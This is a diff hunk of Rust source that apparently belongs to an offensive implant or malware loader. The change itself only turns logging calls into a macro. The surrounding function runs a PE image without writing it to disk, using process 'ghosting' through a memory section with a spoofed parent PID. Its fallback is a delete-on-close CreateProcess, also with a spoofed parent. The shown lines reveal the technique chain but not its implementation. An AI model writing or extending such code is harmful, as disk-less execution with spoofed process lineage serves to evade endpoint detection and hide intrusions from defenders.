@@ -103,21 +103,21 @@ pub fn spawn_host_zero_disk(pe: &[u8], parent_name: &str) -> Result<SpoofedPiped
         // Prefer ghost section path with real ParentProcess handle
         match unsafe { ghost_section_spawn(pe, parent_name) } {
             Ok(c) => {
-                crate::utils::db_print(&format!(
+                crate::db_print!(
                     "[host] zero-disk: section+PPID ok pid={} parent~{}",
                     c.pid, parent_name
-                ));
+                );
                 return Ok(c);
             }
             Err(e) => {
-                crate::utils::db_print(&format!("[host] section+PPID failed: {e}"));
+                crate::db_print!("[host] section+PPID failed: {e}");
             }
         }
         // Fallback: delete-on-close CreateProcess (PPID via PROC_THREAD_ATTRIBUTE)
         match unsafe { delete_on_close_createprocess(pe, parent_name) } {
             Ok(c) => {
-                crate::utils::db_print(
-                    "[host] zero-residual: delete-on-close+PPID CreateProcess ok",
+                crate::db_print!(
+                    "[host] zero-residual: delete-on-close+PPID CreateProcess ok"
                 );
                 Ok(c)
             }
